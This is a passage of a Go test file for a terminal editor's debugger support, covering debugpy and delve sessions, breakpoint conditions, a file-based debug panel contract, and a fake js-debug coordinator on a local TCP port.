	if err := os.WriteFile(path, []byte(src), 0o644); err != nil {
		t.Fatal(err)
	}

	a := newTestApp(t, dir)
	a.openFile(path)
	t.Cleanup(a.stopDebugSession)

	if !a.hasDebuggableTab() {
		t.Fatal("hasDebuggableTab is false for a .py file; F5 would refuse before starting")
	}

	// Buffer line 1 is `    total = a + b`. Checked by TEXT.
	const bpLine = 1
	if got := a.activeTabPtr().LineText(bpLine); !strings.Contains(got, "total = a + b") {
		t.Fatalf("fixture line %d is %q", bpLine, got)
	}
	a.activeTabPtr().MoveCursorTo(editor.Position{Line: bpLine, Col: 0}, false)
	a.handleKey(tcell.NewEventKey(tcell.KeyF9, 0, tcell.ModNone))
	a.syncBreakpoints()

	a.handleKey(tcell.NewEventKey(tcell.KeyF5, 0, tcell.ModNone))
	if a.debug == nil {
		t.Fatalf("F5 did not start a session on a Python file; status %q", a.statusMsg)
	}
	if a.debug.adapter != "debugpy" {
		t.Fatalf("F5 started %q for a .py file", a.debug.adapter)
	}

	if !pumpEvents(t, a, 120*time.Second, func() bool {
		return a.debug != nil && a.debug.stopped && a.debug.path != ""
	}) {
		state := "no session"
		if a.debug != nil {
			state = fmt.Sprintf("starting=%v running=%v stopped=%v", a.debug.starting, a.debug.running, a.debug.stopped)
		}
		t.Fatalf("the program never stopped on the breakpoint (%s). last status: %q", state, a.statusMsg)
	}
	a.draw()

	if got := a.activeTabPtr().LineText(a.debug.line); !strings.Contains(got, "total = a + b") {
		t.Errorf("stopped on a line whose text is %q, not the marked line", got)
	}
	if got := gutterRuneAt(t, a, bpLine); got != '▶' {
		t.Errorf("the gutter on the stopped line is %q, want '▶'", got)
	}
	if !strings.Contains(a.debugStatus(), "fixture.py:2") {
		t.Errorf("status %q does not report the 1-based stopped location", a.debugStatus())
	}
	t.Logf("F5 on Python → %s · gutter shows ▶", a.debugStatus())

	// Evaluate in the stopped frame answers about THIS call.
	tab := a.activeTabPtr()
	tab.MoveCursorTo(editor.Position{Line: bpLine, Col: strings.Index(tab.LineText(bpLine), "a + b")}, false)
	a.menuDebugEvaluate()
	if !pumpEvents(t, a, 30*time.Second, func() bool { return strings.Contains(a.statusMsg, "a = ") }) {
		t.Fatalf("Evaluate never answered on debugpy; status %q", a.statusMsg)
	}
	if !strings.Contains(a.statusMsg, "a = 2") {
		t.Errorf("Evaluate said %q, want `a = 2`", a.statusMsg)
	}
	t.Logf("Evaluate on debugpy → %q", a.statusMsg)

	a.handleKey(tcell.NewEventKey(tcell.KeyF5, 0, tcell.ModNone))
	if !pumpEvents(t, a, 60*time.Second, func() bool { return a.debug == nil }) {
		t.Fatalf("F5 did not resume the Python program to completion; session still %+v", a.debug)
	}
	t.Logf("F5 again → ran to completion: %q", a.statusMsg)
}

// TestConditionEditedWhileStartingStillReachesTheAdapter closes the window
// between F5 and the adapter answering.
//
// 🔴 menuStartDebug snapshots the breakpoint list on the main goroutine and
// sends it from a background one, and bringing an adapter up takes SECONDS —
// it compiles the program. A condition typed inside that window lands on the
// Mark, finds no client to push to, and would then never be sent at all: absent
// for the whole session, on the one breakpoint the user went out of their way
// to refine, with nothing on screen to say so.
//
// The same window must not produce a FALSE refusal either: capabilities do not
// exist until initialize is answered, and a zero Capabilities reads as "supports
// nothing", so a gate that did not exempt `starting` would tell the user their
// debugger cannot do conditions when it can.
func TestConditionEditedWhileStartingStillReachesTheAdapter(t *testing.T) {
	a, path := debugFixture(t)
	tab := a.activeTabPtr()
	tab.SetMark(5, editor.Mark{Kind: editor.MarkBreakpoint, Enabled: true, VerifiedLine: -1})
	tab.MoveCursorTo(editor.Position{Line: 5, Col: 0}, false)
	a.syncBreakpoints()

	// The state menuStartDebug leaves behind: no client yet.
	a.debug = &debugSession{adapter: "delve", starting: true, bound: map[string][]boundBreakpoint{}}

	a.menuSetCondition()
	if !a.promptOpen {
		t.Fatalf("the condition prompt was refused while the adapter was starting; status %q", a.statusMsg)
	}
	a.promptValue = []rune("i == 3")
	a.promptCursor = len(a.promptValue)
	a.promptSubmit()

	if !a.debug.breakpointsDirty {
		t.Fatal("an edit during startup was not recorded; it would never reach the adapter")
	}

	// Now the adapter finishes coming up.
	client, fake := newRecordingAdapter(t)
	a.handleDebugStarted(&debugStartedEvent{
		when: time.Now(), client: client, adapter: "delve",
		caps:  dap.Capabilities{SupportsConditionalBreakpoints: true},
		bound: map[string][]boundBreakpoint{path: {{Requested: 5, Bound: 5, Verified: true}}},
	})

	if !pumpEvents(t, a, 10*time.Second, func() bool { return len(fake.setBreakpointCalls()) > 0 }) {
		t.Fatalf("the condition typed during startup never reached the adapter; requests %+v", fake.requests())
	}
	bps := wireBreakpoints(fake.setBreakpointCalls()[0])
	if len(bps) != 1 || bps[0]["condition"] != "i == 3" {
		t.Fatalf("the resent breakpoints are %+v, want the condition typed during startup", bps)
	}
	if a.debug.breakpointsDirty {
		t.Error("the dirty flag survived the resend; every later start would re-push for nothing")
	}
}

// -----------------------------------------------------------------------------
// The Debug panel contract (Lane B stage 5)
// -----------------------------------------------------------------------------

// panelStateDir points the state package at a temp directory and gives the App
// a publisher writing into it, which newTestApp deliberately does not do — it
// builds a bare App rather than running the constructors.
//
// 🔴 It does NOT touch a.lastDebugSeq. That is the whole subject of
// TestStaleDebugRequestIgnoredAtStartup: a helper that seeded the floor would be
// the test doing the production wiring for it, and the oracle would pass against
// the bug it exists to catch.
func panelStateDir(t *testing.T, a *App) {
	t.Helper()
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	if err := os.MkdirAll(state.Dir(), 0o755); err != nil {
		t.Fatal(err)
	}
	a.debugPub = state.NewDebugPublisher()
}

// writeRawDebugRequest puts a request on disk with an EXACT sequence number,
// which state.WriteDebugRequest cannot do — it always stamps time.Now(). A
// stale request is the only way to exercise the startup floor.
func writeRawDebugRequest(t *testing.T, req state.DebugRequest) {
	t.Helper()
	blob, err := json.Marshal(req)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(state.DebugRequestFile(), blob, 0o644); err != nil {
		t.Fatal(err)
	}
}

// readPublishedSession unmarshals debug-session.json, waiting out the publisher
// debounce. Reading the FILE is the point: this contract exists to be read from
// another process, so asserting on the App's own fields would prove nothing
// about what a panel actually sees.
func readPublishedSession(t *testing.T) state.DebugSession {
	t.Helper()
	deadline := time.Now().Add(2 * time.Second)
	for {
		blob, err := os.ReadFile(state.DebugSessionFile())
		if err == nil {
			var s state.DebugSession
			if json.Unmarshal(blob, &s) == nil && s.TS != 0 {
				return s
			}
		}
		if time.Now().After(deadline) {
			t.Fatalf("no readable debug session at %s after 2s", state.DebugSessionFile())
		}
		time.Sleep(5 * time.Millisecond)
	}
}

// TestStaleDebugRequestIgnoredAtStartup is the ONE place this contract differs
// from openreq.go, and the reason debugreq.go is a separate file.
//
// consumeOpenRequest starts its high-water mark at zero, so a request left on
// disk by a previous session is honoured once at startup. For "open a file"
// that is a surprise; for "start a debug session" it COMPILES AND RUNS a
// program nobody asked for, in whatever project the editor happens to open
// next. A straight copy of consumeOpenRequest fails this test.
//
// The second half proves the floor is a floor and not a blanket refusal: a
// request written after this process started is still honoured. Without it,
// "consumeDebugRequest does nothing at all" would pass.
func TestStaleDebugRequestIgnoredAtStartup(t *testing.T) {
	a, path := debugFixture(t)
	panelStateDir(t, a)

	writeRawDebugRequest(t, state.DebugRequest{
		Action: state.DebugActionStart,
		Seq:    time.Now().Add(-time.Hour).UnixNano(),
	})
	a.consumeDebugRequest()

	if a.debug != nil {
		t.Fatalf("a debug-request written an hour ago started a session (%+v) — the editor "+
			"launched a process the user did not ask for", a.debug)
	}

	// A request from NOW, through the real writer, must still be honoured.
	// toggle-breakpoint rather than start: it is entirely local, so the oracle
	// does not depend on a debugger being installed.
	if err := state.WriteDebugRequest(state.DebugActionToggleBreakpoint, path, 6); err != nil {
		t.Fatal(err)
	}
	a.consumeDebugRequest()
	a.syncBreakpoints()
	if len(a.breakpoints) != 1 || a.breakpoints[0].Line != 5 {
		t.Fatalf("a fresh request was ignored too: breakpoints %+v — the floor must let new "+
			"requests through, not refuse everything", a.breakpoints)
	}
}

// TestDebugRequestTogglesABreakpointAtTheRequestedLine pins the panel's `b`
// key end to end: the wire is 1-based, the mark lands on the 0-based buffer
// line, and a second request clears it.
//
// It also pins that the request is consumed EXACTLY once. Re-reading the same
// file on the next poll and toggling again would make one keypress set and
// clear the breakpoint in the same second, which reads as the key not working.
func TestDebugRequestTogglesABreakpointAtTheRequestedLine(t *testing.T) {
	a, path := debugFixture(t)
	panelStateDir(t, a)
	a.lastDebugSeq = debugRequestFloor

	if err := state.WriteDebugRequest(state.DebugActionToggleBreakpoint, path, 6); err != nil {
		t.Fatal(err)
	}
	a.consumeDebugRequest()
	a.syncBreakpoints()

	if len(a.breakpoints) != 1 {
		t.Fatalf("breakpoints = %+v, want exactly one", a.breakpoints)
	}
	if got := a.breakpoints[0].Line; got != 5 {
		t.Errorf("breakpoint on 0-based line %d, want 5 for the 1-based wire line 6", got)
	}

	// Polling again must NOT re-toggle: the same file is still on disk.
	for i := 0; i < 5; i++ {
		a.consumeDebugRequest()
	}
	a.syncBreakpoints()
	if len(a.breakpoints) != 1 {
		t.Fatalf("re-polling the same request left %d breakpoints — it was honoured more than once",
			len(a.breakpoints))
	}

	// A second, distinct request clears it.
	if err := state.WriteDebugRequest(state.DebugActionToggleBreakpoint, path, 6); err != nil {
		t.Fatal(err)
	}
	a.consumeDebugRequest()
	a.syncBreakpoints()
	if len(a.breakpoints) != 0 {
		t.Fatalf("the second toggle left %+v, want the breakpoint cleared", a.breakpoints)
	}
}

// TestDebugRequestOutsideTheProjectIsIgnored pins the multi-editor guard.
// debug-request.json is ONE global file, so with two editors open on two
// projects a single panel keypress reaches both. Only the editor whose root
// actually contains the file may edit it — the same rule consumeOpenRequest
// applies, through the same helper.
func TestDebugRequestOutsideTheProjectIsIgnored(t *testing.T) {
	a, _ := debugFixture(t)
	panelStateDir(t, a)
	a.lastDebugSeq = debugRequestFloor

	elsewhere := filepath.Join(t.TempDir(), "other.go")
	if err := os.WriteFile(elsewhere, []byte("package other\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := state.WriteDebugRequest(state.DebugActionToggleBreakpoint, elsewhere, 1); err != nil {
		t.Fatal(err)
	}
	a.consumeDebugRequest()
	a.syncBreakpoints()

	if len(a.breakpoints) != 0 {
		t.Fatalf("a request for another project's file was honoured: %+v", a.breakpoints)
	}
}

// TestDebugTestOutsideTheProjectIsConsumed prevents another editor from launching it repeatedly.
func TestDebugTestOutsideTheProjectIsConsumed(t *testing.T) {
	a, _ := debugFixture(t)
	panelStateDir(t, a)
	a.lastDebugSeq = debugRequestFloor
	elsewhere := filepath.Join(t.TempDir(), "test_other.py")
	if err := os.WriteFile(elsewhere, []byte("def test_other(): pass\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := state.WriteDebugRequest(state.DebugActionTest, elsewhere, 0, "test_other"); err != nil {
		t.Fatal(err)
	}
	a.consumeDebugRequest()
	consumed := a.lastDebugSeq
	if consumed <= debugRequestFloor {
		t.Fatal("outside-root test request was not consumed")
	}
	a.consumeDebugRequest()
	if a.lastDebugSeq != consumed || a.debug != nil {
		t.Fatalf("outside request replayed or launched: seq=%d debug=%+v", a.lastDebugSeq, a.debug)
	}
}

// TestDebugRequestMalformedChangesNothing pins that a panel writing junk cannot
// disturb the editor. The file is read on every poll, so anything that threw or
// half-applied would do it several times a second.
func TestDebugRequestMalformedChangesNothing(t *testing.T) {
	a, path := debugFixture(t)
	panelStateDir(t, a)
	a.lastDebugSeq = debugRequestFloor
	a.toggleBreakpointAt(path, 5)
	a.syncBreakpoints()
	before := len(a.breakpoints)

	for _, junk := range []string{"", "{", "not json", `{"action":"launch-missiles","seq":9}`} {
		if err := os.WriteFile(state.DebugRequestFile(), []byte(junk), 0o644); err != nil {
			t.Fatal(err)
		}
		a.consumeDebugRequest()
	}
	a.syncBreakpoints()
	if len(a.breakpoints) != before {
		t.Fatalf("junk on disk changed the breakpoint list from %d to %d", before, len(a.breakpoints))
	}
	if a.debug != nil {
		t.Fatal("junk on disk started a debug session")
	}
}

// TestPublishDebugMirrorsAStoppedSession is the definition of done for the
// editor half of the panel contract: everything the panel prints — the state,
// the stop location, the frames and the breakpoints — has to arrive in one
// payload, in the SAME 1-based coordinates active.json publishes.
//
// The coordinate assertion is the load-bearing one. The App holds 0-based
// buffer lines and there are three line-bearing fields; a stop location that is
// right while a frame is off by one is worse than both being wrong, because
// only one of them looks broken.
func TestPublishDebugMirrorsAStoppedSession(t *testing.T) {
	a, path := debugFixture(t)
	panelStateDir(t, a)

	a.debug = &debugSession{
		adapter: "delve", config: filepath.Dir(path), running: true,
		bound: map[string][]boundBreakpoint{path: {{Requested: 5, Bound: 5, Verified: true}}},
	}
	a.toggleBreakpointAt(path, 5)
	a.handleDebugStopped(&debugStoppedEvent{
		when: time.Now(), path: path, line: 5, frame: "main.add",
		reason: "breakpoint", threadID: 17,
		frames: []debugFrame{
			{ID: 1, Name: "main.add", Path: path, Line: 5},
			{ID: 2, Name: "main.main", Path: path, Line: 9},
		},
	})
	a.syncBreakpoints()
	a.publishDebug()

	got := readPublishedSession(t)
	if got.State != state.DebugStateStopped {
		t.Errorf("state = %q, want %q", got.State, state.DebugStateStopped)
	}
	if got.Adapter != "delve" || got.Reason != "breakpoint" || got.ThreadID != 17 {
		t.Errorf("published %+v, want delve stopped on a breakpoint in thread 17", got)
	}
	if got.File != path || got.Line != 6 {
		t.Errorf("stop location = %s:%d, want %s:6 (0-based buffer line 5)", got.File, got.Line, path)
	}
	if len(got.Frames) != 2 || got.Frames[0].Line != 6 || got.Frames[1].Line != 10 {
		t.Errorf("frames = %+v, want lines 6 and 10", got.Frames)
	}
	if got.Frames[0].Name != "main.add" {
		t.Errorf("top frame = %q, want main.add", got.Frames[0].Name)
	}
	if len(got.Breakpoints) != 1 || got.Breakpoints[0].Line != 6 {
		t.Fatalf("breakpoints = %+v, want one on line 6", got.Breakpoints)
	}
	if !got.Breakpoints[0].Verified {
		t.Error("the adapter bound this breakpoint, so the panel must be told it is verified")
	}
	if got.Root != a.rootDir {
		t.Errorf("root = %q, want %q", got.Root, a.rootDir)
	}
	if got.StaleAfter <= 0 {
		t.Error("staleAfter must travel with the payload, or a reader cannot age out a dead editor")
	}
}

// TestPublishDebugReportsAnUnboundBreakpointHonestly pins that "verified" means
// the adapter said so. With no session nothing has bound anything, and a panel
// showing every breakpoint as verified before F5 would be claiming an answer the
// debugger has not given.
func TestPublishDebugReportsAnUnboundBreakpointHonestly(t *testing.T) {
	a, path := debugFixture(t)
	panelStateDir(t, a)
	a.toggleBreakpointAt(path, 5)
	a.syncBreakpoints()
	a.publishDebug()

	got := readPublishedSession(t)
	if got.State != state.DebugStateIdle {
		t.Fatalf("state = %q, want idle with no session", got.State)
	}
	if len(got.Breakpoints) != 1 {
		t.Fatalf("breakpoints = %+v, want the one that is set", got.Breakpoints)
	}
	if got.Breakpoints[0].Verified {
		t.Error("a breakpoint no adapter has seen was published as verified")
	}
	if got.File != "" || got.Line != 0 {
		t.Errorf("an idle payload carries the location %s:%d, want none", got.File, got.Line)
	}
}

// TestPublishDebugIdleOnShutdown is the CLEAN-EXIT half of the staleness
// contract. Without it a panel opened after the editor quit would keep showing
// the last stop — a program that has not existed since the editor closed.
func TestPublishDebugIdleOnShutdown(t *testing.T) {
	a, path := debugFixture(t)
	panelStateDir(t, a)
	a.debug = &debugSession{adapter: "delve", running: true, bound: map[string][]boundBreakpoint{}}
	a.handleDebugStopped(&debugStoppedEvent{
		when: time.Now(), path: path, line: 5, frame: "main.add", reason: "breakpoint",
	})
	a.publishDebug()
	if got := readPublishedSession(t); got.State != state.DebugStateStopped {
		t.Fatalf("precondition failed: published state is %q, not a stop to clear", got.State)
	}

	a.publishDebugIdle()

	got := readPublishedSession(t)
	if got.State != state.DebugStateIdle {
		t.Errorf("state after shutdown = %q, want idle", got.State)
	}
	if got.File != "" || got.Line != 0 {
		t.Errorf("shutdown left the stop location %s:%d on disk", got.File, got.Line)
	}
}

// TestPublishDebugTerminatedAfterARun pins the state a finished program leaves
// behind. handleDAPTerminated drops the session, so the naive answer is "idle" —
// but the console still holds that run's output, and "your program ran and
// exited" is a different thing to tell the user than "nothing has happened".
func TestPublishDebugTerminatedAfterARun(t *testing.T) {
	a, path := debugFixture(t)
	panelStateDir(t, a)
	a.debug = &debugSession{adapter: "delve", running: true, bound: map[string][]boundBreakpoint{}}
	a.handleDebugStopped(&debugStoppedEvent{when: time.Now(), path: path, line: 5, reason: "breakpoint"})
	a.debug.output = []string{"5"}
	a.handleDAPTerminated(0, true)

	a.publishDebug()
	if got := readPublishedSession(t); got.State != state.DebugStateTerminated {
		t.Fatalf("state = %q after the program exited, want %q", got.State, state.DebugStateTerminated)
	}
}

// TestPublishDebugSurvivesNoPublisher pins the nil-receiver contract at the App
// layer. newTestApp and NewDebugPublisher-with-no-state-directory both leave
// debugPub nil, and the polled call site must not branch on it.
func TestPublishDebugSurvivesNoPublisher(t *testing.T) {
	a, _ := debugFixture(t)
	a.debugPub = nil
	a.publishDebug()
	a.publishDebugIdle()
}

// -----------------------------------------------------------------------------
// Child sessions: the coordinator/leaf split (js-debug)
// -----------------------------------------------------------------------------

// fakeCoordinator is a TCP adapter SERVER shaped like js-debug: the first
// connection is a coordinator that debugs nothing and asks us to open a second,
// and the second is the leaf the debuggee lives in. Every request on every
// connection is recorded, tagged with which connection carried it.
//
// 🔴 A single-connection fake cannot express the bug this exists to catch.
// Arming the coordinator is not an error at any layer — the root accepts
// setBreakpoints and answers plausibly — so the ONLY evidence that breakpoints
// went to the wrong place is which socket they came down. That is why this is a
// real listener over real TCP through the real transport rather than a
// net.Pipe: the second connection IS the thing under test.
type fakeCoordinator struct {
	t  *testing.T
	ln net.Listener

	mu    sync.Mutex
	conns []*fakeCoordConn
}

// fakeCoordConn is one accepted connection and what the app said on it.
type fakeCoordConn struct {
	idx  int
	mu   sync.Mutex
	reqs []recordedRequest
}

// requests returns what this connection carried, oldest first.
func (c *fakeCoordConn) requests() []recordedRequest {
	c.mu.Lock()
	defer c.mu.Unlock()
	return append([]recordedRequest(nil), c.reqs...)
}

// setBreakpointLines returns every line asked for on this connection, across all
// setBreakpoints calls. The LINES rather than the call count, because the
// coordinator legitimately receives a whole-file CLEAR (an empty list) and the
// question is whether it was ever armed.
func (c *fakeCoordConn) setBreakpointLines() []int {
	var out []int
	for _, r := range c.requests() {
		if r.Command != "setBreakpoints" {
			continue
		}
		for _, bp := range wireBreakpoints(r) {
			if line, ok := bp["line"].(float64); ok {
				out = append(out, int(line))
			}
		}
	}
	return out
}

// commands lists the commands this connection carried, for failure messages.
func (c *fakeCoordConn) commands() []string {
	reqs := c.requests()
	out := make([]string, len(reqs))
	for i, r := range reqs {
		out[i] = r.Command
	}
	return out
}

// newFakeCoordinator starts the listener and returns it with the argv an adapter
// should be given to reach it.
//
// The argv echoes the readiness line startServerCommand parses and then sleeps,
// standing in for the adapter process. That keeps the REAL transport in the test
// — spawn, parse the announced address, dial — while the server itself stays
// in-process where its traffic can be read.
func newFakeCoordinator(t *testing.T) (*fakeCoordinator, []string) {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	s := &fakeCoordinator{t: t, ln: ln}
	t.Cleanup(func() { _ = ln.Close() })
	go s.accept()

	argv := []string{"/bin/sh", "-c",
		fmt.Sprintf("echo 'Debug server listening at %s'; sleep 300", ln.Addr().String())}
	return s, argv
}

// accept takes connections until the listener closes, serving each one.
func (s *fakeCoordinator) accept() {
	for {
		conn, err := s.ln.Accept()
		if err != nil {
			return
		}
		s.mu.Lock()
		k := &fakeCoordConn{idx: len(s.conns)}
		s.conns = append(s.conns, k)
		s.mu.Unlock()
		go s.serve(conn, k)
	}
}

// conn returns the idx'th accepted connection, or nil when there is none yet.
func (s *fakeCoordinator) conn(idx int) *fakeCoordConn {
	s.mu.Lock()
	defer s.mu.Unlock()
	if idx >= len(s.conns) {
		return nil
	}
	return s.conns[idx]
}

// connCount is how many connections have been accepted.
func (s *fakeCoordinator) connCount() int {
	s.mu.Lock()
	defer s.mu.Unlock()
	return len(s.conns)
}

// serve answers one connection, playing coordinator on the first and leaf on
// every later one.
//
// 🔴 The ORDER mirrors what js-debug actually does, because the app's sequence
// is shaped around it. `initialized` is sent BEFORE the launch response, and the
// coordinator's startDebugging is withheld until its configurationDone arrives —
// so an implementation that waits for the child before configuring the root
// hangs here exactly as it would against the real adapter.
func (s *fakeCoordinator) serve(conn net.Conn, k *fakeCoordConn) {
	defer conn.Close()
	r := bufio.NewReader(conn)
	seq := 0
	send := func(v interface{}) bool {
		out, err := json.Marshal(v)
		if err != nil {
			return false
		}
		if _, err := fmt.Fprintf(conn, "Content-Length: %d\r\n\r\n", len(out)); err != nil {
			return false
		}
		_, err = conn.Write(out)
		return err == nil
	}
	respond := func(req dap.Request, body interface{}) bool {
		raw, err := json.Marshal(body)
		if err != nil {
			return false
		}
		seq++
		return send(dap.Response{
			Seq: seq, Type: dap.TypeResponse, RequestSeq: req.Seq,
			Success: true, Command: req.Command, Body: raw,
		})
	}
	event := func(name string, body interface{}) bool {
		var raw json.RawMessage
		if body != nil {
			b, err := json.Marshal(body)
			if err != nil {
				return false
			}
			raw = b
		}
		seq++
		return send(dap.Event{Seq: seq, Type: dap.TypeEvent, Event: name, Body: raw})
	}

	for {
		_ = conn.SetDeadline(time.Now().Add(60 * time.Second))
		body, err := readFramed(r)
		if err != nil {
			return
		}
		var req dap.Request
		if json.Unmarshal(body, &req) != nil {
			return
		}
		rec := recordedRequest{Command: req.Command, Args: map[string]interface{}{}}
		if raw, err := json.Marshal(req.Arguments); err == nil {
			_ = json.Unmarshal(raw, &rec.Args)
		}
		k.mu.Lock()
		k.reqs = append(k.reqs, rec)
		k.mu.Unlock()

		switch req.Command {
		case "initialize":
			if !respond(req, map[string]interface{}{
				"supportsConfigurationDoneRequest": true,
				"supportsConditionalBreakpoints":   true,
				"supportsLogPoints":                true,
				"supportsTerminateRequest":         false,
			}) {
				return
			}
			// Before the launch response, as the protocol permits and js-debug does.
			if !event(dap.EventInitialized, map[string]interface{}{}) {
				return
			}

		case "setBreakpoints":
			// Provisional, exactly like js-debug: unverified, no line, and it
			// works anyway.
			answers := make([]map[string]interface{}, 0)
			for range wireBreakpoints(rec) {
				answers = append(answers, map[string]interface{}{
					"id": 1, "verified": false, "message": "breakpoint.provisionalBreakpoint",
				})
			}
			if !respond(req, map[string]interface{}{"breakpoints": answers}) {
				return
			}

		case "configurationDone":
			if !respond(req, struct{}{}) {
				return
			}
			if k.idx == 0 {
				// 🔴 Only NOW, and only on the coordinator. Withholding it until
				// configurationDone is what makes "await the child first" a hang
				// rather than a slow start.
				seq++
				if !send(dap.Request{
					Seq: seq, Type: dap.TypeRequest, Command: dap.CommandStartDebugging,
					Arguments: map[string]interface{}{
						"request": "launch",
						"configuration": map[string]interface{}{
							"type": "pwa-node", "name": "fixture.js [4242]",
							"__pendingTargetId": "the-child-target",
						},
					},
				}) {
					return
				}
			}

		default:
			if !respond(req, struct{}{}) {
				return
			}
		}
	}
}

// withFakeJsDebugAdapter registers an adapter for JavaScript that resolves to a
// fake coordinator, and restores the real table afterwards.
//
// 🔴 PREPENDED, not appended. AdapterFor returns the FIRST entry claiming a
// language, so appending would leave the real js-debug in charge and this test
// would silently be measuring whatever is installed on the machine — or skipping
// on a machine with nothing installed, which reads as a pass.
//
// lazyBind is a parameter rather than a constant so the SAME fake can be run
// both ways. Running it with lazyBind false is what proved
// TestProvisionalBreakpointsAreNotReportedAsFailures is not vacuous: the editor
// announced "1 breakpoint(s) could not be set on an executable line", drew a
// hollow circle on it, and published it to the panel as unverified — three
// visible claims, all false, about a breakpoint that binds.
func withFakeJsDebugAdapter(t *testing.T, argv []string, lazyBind bool) {
	t.Helper()
	saved := dap.DefaultAdapters
	dap.DefaultAdapters = append([]dap.Adapter{{
		Name:      "fake-js-debug",
		AdapterID: "pwa-node",
		Locate:    func(string) *dap.Command { return &dap.Command{Argv: argv, Origin: "test"} },
		Transport: dap.TransportServer,
		Languages: []string{"javascript"},
		// A config type of its own rather than borrowing "node": the launch.json
		// router selects on ConfigTypes, and taking the real row's spelling would
		// make which adapter answered depend on table order in yet another place.
		ConfigTypes:           []string{"fake-node"},
		WorkspaceFolderKey:    "__workspaceFolder",
		UsesChildSessions:     true,
		BreakpointsBindLazily: lazyBind,
		Launch:                map[string]interface{}{"request": "launch", "type": "pwa-node"},
	}}, saved...)
	t.Cleanup(func() { dap.DefaultAdapters = saved })
}

// jsAppFixture writes a small JavaScript file and opens it.
func jsAppFixture(t *testing.T) (*App, string) {
	t.Helper()
	dir := t.TempDir()
	path := filepath.Join(dir, "fixture.js")
	src := "function add(a, b) {\n  const total = a + b;\n  return total;\n}\nconsole.log(add(2, 3));\n"
	if err := os.WriteFile(path, []byte(src), 0o644); err != nil {
		t.Fatal(err)
	}
	a := newTestApp(t, dir)
	a.openFile(path)
	if a.activeTabPtr() == nil {
		t.Fatal("fixture file did not open")
	}
	return a, path
}

// TestStartDebuggingOpensAChildAndRoutesBreakpointsToIt is the single most
// load-bearing test for the third adapter.
//
// 🔴 It asserts on the RECORDED WIRE TRAFFIC that the user's breakpoint went
// down the CHILD connection, and never down the coordinator's. Nothing else can
// see that difference. js-debug's root accepts setBreakpoints and answers
// plausibly; it simply never binds them, so an editor that arms the root
// initialises cleanly, reports "js-debug running", paints the breakpoint, and
// then lets the program run to completion. Every layer is green and the feature
// does not exist — which is exactly the failure mode this fork has shipped
// three times before.
//
// The negative half is what makes it an oracle: asserting only that the child
// received the breakpoint would also pass for an implementation that armed BOTH,
// and arming both would have masked the bug on the real adapter.
func TestStartDebuggingOpensAChildAndRoutesBreakpointsToIt(t *testing.T) {
	server, argv := newFakeCoordinator(t)
	withFakeJsDebugAdapter(t, argv, true)

	a, _ := jsAppFixture(t)
	t.Cleanup(a.stopDebugSession)

	// Buffer line 1 is `const total = a + b`. Checked by TEXT: a hardcoded line
	// that happens to match proves nothing about the conversion.
	const bpLine = 1
	if got := a.activeTabPtr().LineText(bpLine); !strings.Contains(got, "const total = a + b") {
		t.Fatalf("fixture line %d is %q, not the line meant to be marked", bpLine, got)
	}
	a.activeTabPtr().MoveCursorTo(editor.Position{Line: bpLine, Col: 0}, false)
	a.handleKey(tcell.NewEventKey(tcell.KeyF9, 0, tcell.ModNone))
	a.syncBreakpoints()
	if len(a.breakpoints) != 1 {
		t.Fatalf("F9 did not register a breakpoint: %v", a.breakpoints)
	}

	a.handleKey(tcell.NewEventKey(tcell.KeyF5, 0, tcell.ModNone))
	if a.debug == nil {
		t.Fatal("F5 did not start a debug session")
	}

	if !pumpEvents(t, a, 60*time.Second, func() bool {
		return a.debug != nil && a.debug.running && a.debug.root != nil
	}) {
		state := "no session"
		if a.debug != nil {
			state = fmt.Sprintf("starting=%v running=%v root=%v", a.debug.starting, a.debug.running, a.debug.root != nil)
		}
		t.Fatalf("the session never came up through a child (%s). connections accepted: %d. "+
			"last status: %q", state, server.connCount(), a.statusMsg)
	}

	// TWO connections: a coordinator and a leaf.
	if got := server.connCount(); got != 2 {
		t.Fatalf("the adapter server accepted %d connection(s), want 2 — a coordinator and a child", got)
	}
	root, child := server.conn(0), server.conn(1)

	// The 1-based line the adapter should have been told about.
	wantLine := bpLine + 1

	// --- the negative half --------------------------------------------------
	if lines := root.setBreakpointLines(); len(lines) != 0 {
		t.Errorf("🔴 the COORDINATOR was armed with breakpoints on lines %v. js-debug's root "+
			"session debugs nothing: it accepts these, answers plausibly, and never binds them, "+
			"so the program runs straight past every breakpoint while the editor reports a "+
			"healthy session. Requests seen on the root: %v", lines, root.commands())
	}

	// --- the positive half --------------------------------------------------
	if child == nil {
		t.Fatal("no child connection was opened")
	}
	childLines := child.setBreakpointLines()
	if len(childLines) == 0 {
		t.Fatalf("the CHILD was never sent any breakpoints; requests seen on it: %v", child.commands())
	}
	found := false
	for _, l := range childLines {
		if l == wantLine {
			found = true
		}
	}
	if !found {
		t.Errorf("the child was armed on lines %v, which does not include the marked line %d",
			childLines, wantLine)
	}

	// The child must also have been configured, or it never runs.
	if !containsCommand(child.commands(), "configurationDone") {
		t.Errorf("the child never received configurationDone; requests: %v", child.commands())
	}
	// And the ROOT must have been, or js-debug never launches and startDebugging
	// never arrives — which is the hang the sequence is ordered to avoid.
	if !containsCommand(root.commands(), "configurationDone") {
		t.Errorf("the coordinator never received configurationDone; requests: %v", root.commands())
	}

	// The UI talks to the LEAF, and the coordinator is held only to be stopped
	// last. A session whose client is the root is the bug this whole test is for.
	if a.debug.client == a.debug.root {
		t.Error("the session's client IS the coordinator; every later request would go to the " +
			"connection that debugs nothing")
	}
	t.Logf("root saw %v · child saw %v", root.commands(), child.commands())
}

// containsCommand reports whether a recorded command list holds one.
func containsCommand(cmds []string, want string) bool {
	for _, c := range cmds {
		if c == want {
			return true
		}
	}
	return false
}

// TestProvisionalBreakpointsAreNotReportedAsFailures is the UI half of
// Adapter.BreakpointsBindLazily.
//
// 🔴 js-debug answers every setBreakpoints unverified. Read the way delve's
// answers are read, the gutter paints a hollow ○ on a breakpoint that works and
// the status line announces it "could not be set on an executable line" — about
// a program that is about to stop on it. Both claims are visible to the user and
// both are false, which is worse than a missing feature: it sends someone
// looking for a bug in their own code.
func TestProvisionalBreakpointsAreNotReportedAsFailures(t *testing.T) {
	_, argv := newFakeCoordinator(t)
	withFakeJsDebugAdapter(t, argv, true)

	a, _ := jsAppFixture(t)
	t.Cleanup(a.stopDebugSession)

	const bpLine = 1
